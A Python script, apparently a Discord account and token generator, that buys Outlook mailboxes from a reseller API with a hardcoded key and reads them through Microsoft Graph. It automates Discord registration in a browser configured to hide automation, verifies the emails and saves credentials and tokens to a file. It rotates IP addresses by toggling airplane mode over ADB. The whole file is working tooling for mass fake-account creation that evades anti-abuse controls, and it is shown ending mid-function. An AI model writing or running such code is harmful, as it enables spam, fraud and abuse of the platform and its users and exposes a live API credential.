global SESSION_STOP
global SESSION_TARGET
global SESSION_CREATED
import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import tls_client
from colorama import Fore, Style, init
from rich.console import Console
import warnings
import nodriver as uc
import urllib3
import base64
import uuid

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', category=ResourceWarning)
warnings.filterwarnings('ignore', message='.*connection.*refused.*')
warnings.filterwarnings('ignore', message='.*Task exception was never retrieved.*')

import logging
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('websockets').setLevel(logging.CRITICAL)
logging.getLogger('nodriver').setLevel(logging.CRITICAL)


async def fetch_discord_token(email: str, password: str) -> str:
    url = 'https://discord.com/api/v9/auth/login'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    payload = {
        'login': email,
        'password': password,
        'undelete': False
    }
    try:
        session = tls_client.Session(client_identifier='chrome_131', random_tls_extension_order=True)
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ''
        response_data = response.json()
        token = response_data.get('token')
        if not token:
            return ''
        return token
    except Exception as e:
        return ''


JS_UTILS = '''
(() => {
    if (window.utils) return;
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                cb.dispatchEvent(new Event('change', { bubbles: true }));
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    function setDropdown(label, value) {
        const dropdown = document.querySelector(`div[role="button"][aria-label="${label}"]`);
        if (!dropdown) return;
        
        dropdown.click();
        
        setTimeout(() => {
            const options = document.querySelectorAll('div[role="option"]');
            const match = Array.from(options).find(opt => opt.textContent.trim() === value);
            if (match) match.click();
        }, 100);
    }
    
    function waitForDiscordToken(timeout = 5000) {
        return new Promise((resolve) => {
            const start = Date.now();
            const check = () => {
                const token = localStorage.getItem('token');
                if (token) {
                    resolve(token.replace(/^"|"$/g, ''));
                } else if (Date.now() - start < timeout) {
                    setTimeout(check, 200);
                } else {
                    resolve(null);
                }
            };
            check();
        });
    }
    
    function findCaptchaFrame() {
        const iframes = document.querySelectorAll('iframe');
        for (let iframe of iframes) {
            const src = iframe.src || '';
            if (src.includes('captcha') || src.includes('hcaptcha') || src.includes('recaptcha')) {
                return iframe;
            }
        }
        return null;
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
        setDropdown,
        waitForDiscordToken,
        findCaptchaFrame
    };
})();
'''

console = Console()
LOCK = threading.Lock()
SCRIPT_DIR = Path(__file__).parent
MS_CLIENT_ID = 'd8fbe69d-15be-43fa-b204-5c5bc5a73ad7'
ZEUSX_CLIENT_KEY = 'ec5481ac7b3c44c9a0df1eceefb2d852'

SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False

config_path = Path('config.json')
if config_path.exists():
    with open(config_path, 'r', encoding='utf-8') as f:
        config = json.load(f)
    needs_save = False
    if 'NormalCooldownSeconds' not in config:
        config['NormalCooldownSeconds'] = config.get('CooldownSeconds', 6)
        needs_save = True
    if 'AdbCooldownSeconds' not in config:
        config['AdbCooldownSeconds'] = 0
        needs_save = True
    if 'CooldownSeconds' in config:
        del config['CooldownSeconds']
        needs_save = True
    if needs_save:
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
else:
    config = {
        'NormalCooldownSeconds': 6,
        'AdbCooldownSeconds': 0,
        'Threads': 1,
        'zeus_api_key': ''
    }
    with open(config_path, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)
    print(f'[DEBUG] Default config saved to {config_path}')


class Logger:
    def __init__(self):
        return

    def get_time(self):
        return datetime.now().strftime('%H:%M:%S')

    def info(self, message: str):
        print(f'{Fore.LIGHTCYAN_EX}[INFO]{Fore.RESET} {message}')

    def success(self, message: str):
        print(f'{Fore.LIGHTGREEN_EX}[SUCCESS]{Fore.RESET} {message}')

    def warning(self, message: str):
        print(f'{Fore.YELLOW}[WARNING]{Fore.RESET} {message}')

    def error(self, message: str):
        print(f'{Fore.RED}[ERROR]{Fore.RESET} {message}')

    def debug(self, message: str):
        print(f'{Fore.BLUE}[DEBUG]{Fore.RESET} {message}')


log = Logger()


def load_proxies(config: dict) -> list:
    proxy_enabled = config.get('proxy', {}).get('enabled', False)
    if not proxy_enabled:
        return []
    proxy_file = config.get('proxy', {}).get('file', 'input/proxies.txt')
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f'Proxy file not found: {proxy_file}')
        log.info(f'Create file at: {proxy_path.absolute()}')
        return []
    try:
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            log.success(f'Loaded {len(proxies)} proxies from {proxy_file}')
            for i, p in enumerate(proxies, 1):
                log.info(f'  Proxy {i}: {p}')
            return proxies
        else:
            log.warning('Proxy file is empty')
            return []
    except Exception as e:
        log.error(f'Error loading proxies: {e}')
        return []


def get_random_proxy(proxies: list) -> str:
    if not proxies:
        return None
    return random.choice(proxies)


def is_connected():
    try:
        requests.get('https://1.1.1.1', timeout=3, verify=False)
        return True
    except:
        return False


class ZeusXAPI:
    def __init__(self, client_key: str):
        self.session = requests.Session()
        self.session.verify = False
        self.client_key = client_key
        self.base_url = 'https://api.zeus-x.ru'
        self.account_codes = ['HOTMAIL', 'OUTLOOK']

    def get_instock(self) -> list:
        try:
            resp = self.session.get(f'{self.base_url}/instock', timeout=15, verify=False)
            log.warning(f'ZeusX instock raw: {resp.text[:800]}')
        except Exception as e:
            log.error(f'ZeusX instock error: {e}')
        return self.account_codes

    def _purchase(self, account_code: str) -> dict:
        try:
            resp = self.session.get(
                f'{self.base_url}/purchase',
                params={'apikey': self.client_key, 'accountcode': account_code, 'quantity': 1},
                timeout=20,
                verify=False
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get('Code') == 0:
                    accounts = data.get('Data', {}).get('Accounts', [])
                    if accounts:
                        acc = accounts[0]
                        return {
                            'success': True,
                            'email': acc.get('Email', ''),
                            'password': acc.get('Password', ''),
                            'token': acc.get('RefreshToken', ''),
                            'uuid': acc.get('ClientId', '')
                        }
                    else:
                        log.error('ZeusX: no accounts in response')
                else:
                    log.error(f"ZeusX API error: {data.get('Message')}")
            else:
                log.error(f'ZeusX HTTP {resp.status_code}: {resp.text[:200]}')
        except Exception as e:
            log.error(f'ZeusX purchase error: {e}')
        return {'success': False}

    def check_balance(self) -> str:
        try:
            resp = self.session.get(
                f'{self.base_url}/balance',
                params={'apikey': self.client_key},
                timeout=15,
                verify=False
            )
            if resp.status_code == 200:
                data = resp.json()
                balance = data.get('balance') or data.get('credits') or data
                return str(balance)
            return 'unknown'
        except Exception as e:
            log.error(f'ZeusX balance error: {e}')
            return 'error'

    def buy_email(self) -> dict:
        if not self.client_key:
            log.error('Missing zeus-x apikey in config')
            return {'success': False, 'error': 'Missing apikey'}

        while not SESSION_STOP:
            if not is_connected():
                log.warning('Internet disconnected! Pausing attempts...')
                while not is_connected() and not SESSION_STOP:
                    time.sleep(5)
                if SESSION_STOP:
                    break
                log.success('Internet reconnected! Resuming attempts...')

            for code in self.account_codes:
                if SESSION_STOP:
                    break
                log.info(f'ZeusX purchasing {code}...')
                try:
                    result = self._purchase(code)
                    if result.get('success'):
                        log.success(f"✓ ZeusX got {code}: {result['email']}")
                        return result
                except Exception as e:
                    err_str = str(e)
                    if any(x in err_str for x in ['Connection', 'Resolv', 'getaddrinfo', 'Timeout']):
                        pass
                    else:
                        log.error(f'ZeusX purchase error: {e}')
            if SESSION_STOP:
                break
            time.sleep(2)
        return {'success': False, 'error': 'Stopped'}


def get_zeusx_email(config: dict) -> tuple:
    zeusx_cfg = config.get('email_api', {}).get('zeusx', {})
    client_key = ZEUSX_CLIENT_KEY
    auto_buy = zeusx_cfg.get('auto_buy', True)
    if not auto_buy or not client_key:
        return (None, None, None, None)
    api = ZeusXAPI(client_key)
    result = api.buy_email()
    if result.get('success'):
        return (result['email'], result['password'], result.get('token', ''), result.get('uuid', ''))
    else:
        log.error('ZeusX: failed to obtain email')
        return (None, None, None, None)


def get_email_from_provider(config: dict) -> tuple:
    email, password, token, uuid = get_zeusx_email(config)
    if email:
        return (email, password, token, uuid, 'zeusx')
    else:
        log.error('Zeus-X email provider failed')
        return (None, None, None, None, None)


def get_access_token(refresh_token: str, client_id: str = None) -> Optional[str]:
    try:
        cid = client_id or MS_CLIENT_ID
        if refresh_token.endswith('$'):
            refresh_token = refresh_token[:-1]
        response = requests.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            data={
                'client_id': cid,
                'refresh_token': refresh_token,
                'grant_type': 'refresh_token',
                'scope': 'https://graph.microsoft.com/.default'
            },
            timeout=30,
            verify=False
        )
        result = response.json()
        return result.get('access_token')
    except Exception as e:
        log.error(f'Token refresh error: {e}')
        return None


def verify_email_via_discord_api(token: str, verify_url: str) -> Optional[str]:
    try:
        if "token=" in verify_url:
            vt = verify_url.split("token=")[-1].split("&")[0]
            log.info(f"Verification token extracted")
            
            session = tls_client.Session(client_identifier='chrome_138', random_tls_extension_order=True)
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = session.post(
                'https://discord.com/api/v9/auth/verify',
                json={'token': vt},
                headers=headers
            )
            
            log.info(f"API verify response: {response.status_code}")
            if response.status_code in [200, 204]:
                new_token = response.json().get('token', token) if response.text else token
                log.success(f"Email verified via Discord API!")
                return new_token
            else:
                log.warning(f"API verify failed: {response.status_code}")
    except Exception as e:
        log.warning(f"Discord API verification error: {e}")
    return None


async def verify_email_chrome_fallback(verify_url: str) -> bool:
    log.info("Opening Chrome for browser verification (fallback)...")
    
    chrome_browser = None
    try:
        chrome_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
        ]
        
        chrome_path = None
        for path in chrome_paths:
            if os.path.exists(path):
                chrome_path = path
                break
        
        chrome_browser = await uc.start(
            headless=False,
            browser_executable_path=chrome_path,
            browser_args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-automation",
                "--no-first-run",
                "--window-size=1280,800"
            ]
        )
        
        page = await chrome_browser.get(verify_url)
        await asyncio.sleep(5)
        
        for attempt in range(60):
            try:
                current_url = await page.evaluate('window.location.href')
                
                if 'discord.com/app' in current_url or 'discord.com/channels' in current_url:
                    log.success("Email verified via Chrome browser!")
                    return True
                
                if 'discord.com/login' in current_url:
                    log.success("Email verified! Redirected to login")
                    return True
                
                if attempt % 15 == 14:
                    log.info(f"Verification pending... ({attempt+1}s)")
                
            except Exception as e:
                pass
            
            await asyncio.sleep(1)
        
        log.warning("Chrome verification timed out")
        return False
        
    except Exception as e:
        log.warning(f"Chrome verification error: {e}")
        return False
    finally:
        if chrome_browser:
            try:
                await chrome_browser.stop()
            except:
                pass


def fetch_verification_url(email_data: Dict, timeout: int = 120) -> Optional[str]:
    log.info('Fetching verification email from inbox...')
    refresh_token = email_data.get('token', '')
    client_id = email_data.get('uuid', '') or MS_CLIENT_ID
    access_token = get_access_token(refresh_token, client_id)
    if not access_token:
        log.error('Failed to get Graph access token')
        return None

    start_time = time.time()
    attempt = 0
    while time.time() - start_time < timeout:
        attempt += 1
        try:
            response = requests.get(
                'https://graph.microsoft.com/v1.0/me/messages',
                headers={'Authorization': f'Bearer {access_token}'},
                params={
                    '$top': 5,
                    '$orderby': 'receivedDateTime desc',
                    '$select': 'subject,body,from,bodyPreview,receivedDateTime'
                },
                timeout=15,
                verify=False
            )
            emails = response.json().get('value', [])
            if attempt % 5 == 0:
                elapsed = int(time.time() - start_time)
                log.info(f'Checking inbox... ({elapsed}s elapsed)')

            for email in emails:
                subject = email.get('subject', '').lower()
                from_addr = email.get('from', {}).get('emailAddress', {}).get('address', '').lower()
                is_verify_email = ('verify' in subject or 'confirm' in subject or 'email' in subject) and \
                                 ('discord' in from_addr or 'noreply@discord.com' in from_addr)
                if not is_verify_email:
                    continue
                body_html = email.get('body', {}).get('content', '')
                verify_pattern = r'https://discord\.com/verify\?token=[^\"\'\>\s]+'
                direct_match = re.search(verify_pattern, body_html)
                if direct_match:
                    log.success('Found verify link in email!')
                    return direct_match.group(0)
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^\"\'\>\s]+',
                    r'https://links\.discord\.com[^\"\'\>\s]+'
                ]
                for pat in click_patterns:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            resp = requests.get(url, allow_redirects=True, verify=False, timeout=10)
                            final_url = resp.url
                            if 'discord.com/verify' in final_url:
                                log.success('Found verify link via redirect!')
                                return final_url
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^\"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success('Found verify link in response body!')
                                return verify_in_body.group(0)
                        except:
                            pass
                log.warning('Discord email found but no valid verify link')
            time.sleep(3)
        except Exception as e:
            log.warning(f'Graph API error: {e}')
    log.warning('Verification email not found after timeout')
    return None


def generate_username() -> str:
    adjectives = ['Cool', 'Epic', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master']
    nouns = ['Gamer', 'Player', 'User', 'Hero', 'Legend', 'Champion', 'Warrior']
    return f'{random.choice(adjectives)}{random.choice(nouns)}{random.randint(100, 9999)}'


def generate_password(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + '!@#$%^&*'
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password


def check_token(token: str) -> str:
    try:
        session = tls_client.Session(client_identifier='chrome_138', random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        if response.status_code == 403:
            return 'LOCKED'
        if response.status_code == 401:
            return 'INVALID'
        return 'INVALID'
    except Exception as e:
        return 'ERROR'


def save_account_to_file(email: str, password: str, token: str, status: str):
    try:
        tokens_file = Path('tokens.txt')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        account_line = f'{email}:{password}:{token} | Status: {status} | Date: {timestamp}\n'
        
        with open(tokens_file, 'a', encoding='utf-8') as f:
            f.write(account_line)
        
        log.success(f'✓ Account saved to tokens.txt')
        return True
    except Exception as e:
        log.error(f'Failed to save account: {e}')
        return False


def check_email_verified_api(token: str):
    try:
        session = tls_client.Session(client_identifier='chrome_138', random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            data = response.json()
            verified = data.get('verified', False)
            email = data.get('email', 'N/A')
            return (verified, email)
        return (None, None)
    except Exception as e:
        return (None, None)


async def fill_registration_form(page, email: str, display_name: str, username: str, password: str) -> bool:
    log.info('Filling form...')
    
    try:
        email_element = await page.wait_for('input[name="email"]', timeout=10000)
        await email_element.send_keys(email)
        await asyncio.sleep(0.1)
        log.success('✓ Email filled')
    except Exception as e:
        log.error(f'Email input failed: {e}')
        return False

    try:
        display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
        await display_element.send_keys(display_name)
        await asyncio.sleep(0.1)
        log.success('✓ Display name filled')
    except Exception as e:
        log.error(f'Display name input failed: {e}')
        return False

    try:
        username_element = await page.wait_for('input[name="username"]', timeout=5000)
        await username_element.send_keys(username)
        await asyncio.sleep(0.1)
        log.success('✓ Username filled')
    except Exception as e:
        log.error(f'Username input failed: {e}')
        return False

    try:
        password_element = await page.wait_for('input[aria-label="Password"]', timeout=5000)
        await password_element.send_keys(password)
        await asyncio.sleep(0.1)
        log.success('✓ Password filled')
    except Exception as e:
        log.error(f'Password input failed: {e}')
        return False

    await asyncio.sleep(0.2)
    await fill_date_of_birth(page)
    await asyncio.sleep(0.1)

    try:
        await page.evaluate('''
            document.querySelectorAll('input[type="checkbox"]').forEach(function(cb) {
                if (!cb.checked) cb.click();
            });
        ''')
        log.success('✓ Checkboxes clicked')
    except Exception as e:
        log.warning(f'Checkbox click failed: {e}')

    clicked = False
    await asyncio.sleep(0.3)
    
    try:
        buttons = await page.query_selector_all('button')
        for button in buttons:
            try:
                text = await button.text_content()
                if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                    await button.click()
                    clicked = True
                    log.success(f'✓ Clicked button: {text[:30]}')
                    break
            except:
                continue
                
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
                    log.success('✓ Clicked submit button')
            except:
                pass
        
        if not clicked:
            clicked_eval = await page.evaluate('''
                () => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }
            ''')
            if clicked_eval:
                clicked = True
                log.success('Clicked submit button via evaluate')
        
        if not clicked:
            log.error('✗ Failed to click submit button!')
            return False
            
        log.success('✓ Form submitted!')
        return True
        
    except Exception as e:
        log.error(f'Form fill error: {e}')
        return False


async def fill_date_of_birth(page):
    months = ['January', 'February', 'March', 'April', 'May', 'June',
              'July', 'August', 'September', 'October', 'November', 'December']
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1990, 2004))

    try:
        result = await page.evaluate(f'''
            (async () => {{
                async function selectDropdown(label, value) {{
                    const dropdown = document.querySelector(`div[role="button"][aria-label="${{label}}"]`);
                    if (!dropdown) return false;
                    dropdown.click();
                    await new Promise(r => setTimeout(r, 500));
                    const options = document.querySelectorAll('[role="option"]');
                    for (let i = 0; i < options.length; i++) {{
                        if (options[i].textContent.trim() === value) {{
                            options[i].click();
                            return true;
                        }}
                    }}
                    return false;
                }}
                
                const monthResult = await selectDropdown("Month", "{month}");
                await new Promise(r => setTimeout(r, 300));
                const dayResult = await selectDropdown("Day", "{day}");
                await new Promise(r => setTimeout(r, 300));
                const yearResult = await selectDropdown("Year", "{year}");
                
                return {{ month: monthResult, day: dayResult, year: yearResult }};
            }})()
        ''')
        if result:
            log.success(f'✓ DOB: {month} {day}, {year}')
    except Exception as e:
        log.debug(f'DOB error: {e}')


async def wait_for_account_creation(page, timeout: int = 300) -> bool:
    start_time = time.time()
    while time.time() - start_time < timeout:
        await asyncio.sleep(2)
        try:
            current_url = await page.evaluate('window.location.href')
            
            if 'discord.com/channels' in current_url or 'discord.com/app' in current_url:
                log.success('Registration successful!')
                return True
            
            token = await page.evaluate('''
                (function() {
                    try {
                        var t = localStorage.getItem("token");
                        if (t && t.length > 30) return t;
                    } catch(e) {}
                    return null;
                })()
            ''')
            if token:
                log.success('Token found in localStorage!')
                return True
                
            elapsed = int(time.time() - start_time)
            if elapsed % 30 == 0 and elapsed > 0:
                log.info(f'Waiting for completion... ({elapsed}s)')
                
        except Exception as e:
            pass
    
    log.error('Timeout waiting for account creation')
    return False


async def wait_for_discord_token(page, timeout: int = 30, email: str = None, password: str = None):
    if not email or not password:
        log.error('Email and password required for token fetch')
        return None
        
    await asyncio.sleep(3)
    
    for attempt in range(5):
        try:
            token = await fetch_discord_token(email, password)
            if token:
                return token
            log.warning(f'API returned empty token (attempt {attempt + 1})')
            await asyncio.sleep(3)
        except Exception as e:
            log.debug(f'Error fetching token via API: {e}')
    
    return None


async def safe_browser_get(browser, url: str, max_retries: int = 3):
    for attempt in range(max_retries):
        try:
            page = await browser.get(url)
            return page
        except Exception as e:
            if attempt < max_retries - 1:
                log.warning(f'Browser navigation failed (attempt {attempt + 1}/{max_retries}), retrying...')
                await asyncio.sleep(2)
            else:
                log.error(f'Failed to navigate to {url}')
                raise


import subprocess


def get_adb_path():
    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(sys.executable)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, 'adb', 'adb.exe')


def toggle_flight_mode():
    adb_path = get_adb_path()
    log.info('✈️ Toggling Flight Mode via ADB for IP Rotation...')
    try:
        if not os.path.exists(adb_path):
            log.error(f'ADB executable missing! Expected at: {adb_path}')
            return False
        subprocess.run([adb_path, 'shell', 'cmd', 'connectivity', 'airplane-mode', 'enable'],
                       check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        subprocess.run([adb_path, 'shell', 'cmd', 'connectivity', 'airplane-mode', 'disable'],
                       check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log.info('⏳ Waiting for connection to restore...')
        time.sleep(5)
        for _ in range(15):
            if is_connected():
                log.success('✓ Connection restored!')
                return True
            time.sleep(2)
        log.warning('Connection restoration took too long, proceeding anyway...')
        return True
    except Exception as e:
        log.error(f'Flight mode toggle failed: {e}')
        return False


async def worker():
    global SESSION_STOP
    global SESSION_CREATED

    browser = None
    profile_dir = None

    if SESSION_STOP:
        return

    proxy = config.get('proxy_session')
    if proxy:
        log.info(f'Using proxy: {proxy}')
    
    display_name = generate_username()
    username = generate_username()
    password = generate_password()
    
    log.info('Acquiring email from ZeusX...')
    email_from_api = None
    email_password = None
    email_token = None
    email_uuid = None
    email_provider = None
    
    while not email_from_api and not SESSION_STOP:
        result = get_email_from_provider(config)
        if result and result[0]:
            email_from_api, email_password, email_token, email_uuid, email_provider = result
        if not email_from_api and not SESSION_STOP:
            await asyncio.sleep(2)

    if SESSION_STOP:
        if browser is not None:
            try:
                await browser.stop()
            except:
                pass
        if profile_dir and os.path.exists(profile_dir):
            try:
                shutil.rmtree(profile_dir, ignore_errors=True)
            except:
                pass
        return

    email = email_from_api

    try:
        profile_dir = tempfile.mkdtemp(prefix='discord_profile_')
        browser_args = [
            f'--user-data-dir={profile_dir}',
            '--no-first-run',
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-plugins',
            '--disable-web-security',
            '--disable-features=TranslateUI',
        ]

        if proxy:
            if not proxy.startswith('http://') and not proxy.startswith('https://') and not proxy.startswith('socks5://'):
                proxy = f'http://{proxy}'
            browser_args.append(f'--proxy-server={proxy}')
            log.info(f'Proxy argument added: --proxy-server={proxy}')

        log.info('Starting Brave browser...')
        system = platform.system()
        brave_path = None
        if system == 'Windows':
            brave_paths = [
                'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
                'C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
                os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe')
            ]
        elif system == 'Darwin':
            brave_paths = ['/Applications/Brave Browser.app/Contents/MacOS/Brave Browser']
        else:
            brave_paths = ['/usr/bin/brave-browser', '/usr/bin/brave']

        for path in brave_paths:
            if os.path.exists(path):
                brave_path = path
                log.info(f'Found Brave at: {path}')
                break

        if not brave_path:
            log.warning('Brave not found, using default browser')

        browser = await uc.start(
            headless=False,
            browser_executable_path=brave_path,
            browser_args=browser_args + [
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
            ]
        )

        await asyncio.sleep(2)
        log.info('Loading Discord registration page...')
        page = await safe_browser_get(browser, 'https://discord.com/register')

        log.info('Waiting for page to load...')
        page_loaded = False
        for attempt in range(20):
            try:
                email_check = await page.query_selector('input[name="email"]')
                if email_check:
                    page_loaded = True
                    log.success('✓ Page loaded')
                    break
            except:
                pass
            await asyncio.sleep(0.5)

        if not page_loaded:
            log.warning('Page load timeout - continuing anyway')

        await asyncio.sleep(0.5)
        success = await fill_registration_form(page, email, display_name, username, password)
        if not success:
            log.error('Form fill failed')
            if browser is not None:
                try:
                    await browser.stop()
                except:
                    pass
            if profile_dir and os.path.exists(profile_dir):
                try:
                    shutil.rmtree(profile_dir, ignore_errors=True)
                except:
                    pass
            return

        try:
            for _ in range(5):
                x = random.randint(100, 800)
                y = random.randint(100, 600)
                try:
                    await page.mouse_click(x, y)
                except:
                    pass
                await asyncio.sleep(random.uniform(0.05, 0.15))
        except:
            pass

        log.info('Waiting for captcha to be solved...')
        created = await wait_for_account_creation(page)
        if not created:
            log.error('Account creation failed - no redirect detected')
            log.error('Please check if you solved the captcha correctly')
            if browser is not None:
                try:
                    await browser.stop()
                except:
                    pass
            if profile_dir and os.path.exists(profile_dir):
                try:
                    shutil.rmtree(profile_dir, ignore_errors=True)
                except:
                    pass
            return

        log.info('Extracting token...')
        token = await wait_for_discord_token(page, email=email, password=password)
        
        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]
            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f'{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}'

            log.info('Checking email verification status...')
            verified, user_email = check_email_verified_api(token)
            
            if verified is not None and not verified:
                log.info('Email not verified. Attempting to verify via Zeus...')
                
                if email_provider == 'zeusx' and email_token:
                    email_data = {'email': email, 'password': email_password, 'token': email_token, 'uuid': email_uuid}
                    verify_url = fetch_verification_url(email_data)
                    
                    if verify_url:
                        log.success('Got verification URL!')
                        
                        new_token = verify_email_via_discord_api(token, verify_url)
                        if new_token:
                            token = new_token
                        else:
                            await verify_email_chrome_fallback(verify_url)

            log.info('Checking token status...')
            result = check_token(token)
            log.info(f'Token Status: {result}')
            save_account_to_file(email, password, token, result)

            with LOCK:
                SESSION_CREATED += 1
                created_now = SESSION_CREATED
            log.success(f'Token #{created_now} created')

            if result == 'VALID' and config.get('use_adb', False):
                toggle_flight_mode()

            try:
                await browser.stop()
                log.success('✓ Browser stopped')
            except:
                pass

            if PSUTIL_AVAILABLE:
                try:
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            proc_name = proc.info['name'].lower()
                            if any(x in proc_name for x in ['brave', 'chrome']):
                                if proc.info['pid'] != os.getpid():
                                    try:
                                        os.kill(proc.info['pid'], signal.SIGTERM)
                                    except:
                                        pass
                        except:
                            pass
                except:
                    pass

            if profile_dir and os.path.exists(profile_dir):
                await asyncio.sleep(1)
                try:
                    shutil.rmtree(profile_dir, ignore_errors=True)
                except:
                    pass

            browser = None
            profile_dir = None

            session_target = SESSION_TARGET
            if session_target > 0 and created_now >= session_target:
                with LOCK:
                    SESSION_STOP = True
                log.success(f'🎯 Target reached! {created_now}/{session_target} accounts created. Stopping...')
                return

        else:
            log.warning('Could not extract token, but account may be created')

        cooldown = config.get('NormalCooldownSeconds', 6)
        if cooldown > 0:
            log.info(f'Cooldown: Waiting {cooldown} seconds before next account...')
            for remaining in range(cooldown, 0, -1):
                print(f'\r{Fore.YELLOW}[COOLDOWN]{Fore.RESET} Time remaining: {Fore.CYAN}{remaining}s{Fore.RESET} ', end='', flush=True)
                await asyncio.sleep(1)
            print()
            log.success('Cooldown complete! Starting next account...')

    except Exception as e:
        log.error(f'Worker error: {e}')
        import traceback
        traceback.print_exc()
    finally:
        if browser is not None:
            try:
                await browser.stop()
            except:
                pass
        if profile_dir and os.path.exists(profile_dir):
            try:
                shutil.rmtree(profile_dir, ignore_errors=True)
            except:
                pass


async def main():
    global SESSION_STOP
    global SESSION_TARGET
    global SESSION_CREATED

    os.system('cls' if os.name == 'nt' else 'clear')
    banner = '''  ____  _   _ ___ ____ _  __     _____    _    ____  _   _ 
 / __ \| | | |_ _/ ___| |/ /    | ____|  / \  |  _ \| \ | |
| |  | | | | || | |   | ' /     |  _|   / _ \ | |_) |  \| |
| |__| | |_| || | |___| . \     | |___ / ___ \|  _ <| |\  |
 \___\_\\___/|___\____|_|\_\    |_____/_/   \_\_| \_\_| \_|'''
    print(Fore.LIGHTCYAN_EX + banner + Fore.RESET + '\n\n')
    divider = f"{Fore.LIGHTCYAN_EX}{'------------------------------------------------------------'}{Fore.RESET}"

    print(f'\n{divider}\n')

    config['proxy_session'] = None

    while True:
        count_input = input(f'{Fore.LIGHTGREEN_EX}Number of tokens to generate [0 = infinite]: {Fore.RESET}').strip()
        if count_input.isdigit():
            SESSION_TARGET = int(count_input)
            break
        else:
            log.warning('Please enter a valid number (0 for infinite)')

    while True:
        print(f'\n{Fore.LIGHTCYAN_EX}Select Mode:{Fore.RESET}')
        print(f'  {Fore.CYAN}1. Normal mode (No IP Rotation){Fore.RESET}')
        print(f'  {Fore.CYAN}2. Adb mode (Flight Mode IP Rotation){Fore.RESET}')
